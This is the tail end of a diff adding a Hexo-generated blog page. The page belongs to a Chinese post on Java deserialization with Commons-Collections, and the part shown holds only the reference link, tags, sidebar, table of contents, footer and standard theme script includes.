+<li><a href="https://badcode.cc/2018/03/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommons-Collections/" target="_blank" rel="noopener">Java反序列化之Commons-Collections</a></li>
+</ol>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Java反序列化/" rel="tag"># Java反序列化</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/08/14/装机必备的软件/" rel="next" title="装机必备的软件">
+                <i class="fa fa-chevron-left"></i> 装机必备的软件
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">红猪</p>
+              <p class="site-description motion-element" itemprop="description">我活在世上，无非想要明白些道理，遇见些有趣的事。倘能如我所愿，我的一生就算成功。</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">20</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">9</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">31</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/0x4472" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="mailto:0x4472@protonmail.com" target="_blank" title="E-Mail"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  
+                </span>
+              
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Java反序列化利用"><span class="nav-number">1.</span> <span class="nav-text">Java反序列化利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#输入数据执行点"><span class="nav-number">1.1.</span> <span class="nav-text">输入数据执行点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#反序列化传导链"><span class="nav-number">1.2.</span> <span class="nav-text">反序列化传导链</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#反序列化利用点"><span class="nav-number">1.3.</span> <span class="nav-text">反序列化利用点</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CommonsCollections1"><span class="nav-number">2.</span> <span class="nav-text">CommonsCollections1</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#介绍"><span class="nav-number">2.1.</span> <span class="nav-text">介绍</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用条件"><span class="nav-number">2.2.</span> <span class="nav-text">利用条件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#代码分析"><span class="nav-number">2.3.</span> <span class="nav-text">代码分析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#输入数据执行点-1"><span class="nav-number">2.3.1.</span> <span class="nav-text">输入数据执行点</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#反序列化传导链-1"><span class="nav-number">2.3.2.</span> <span class="nav-text">反序列化传导链</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考文章"><span class="nav-number">3.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">红猪</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动 v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Muse</a> v6.3.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
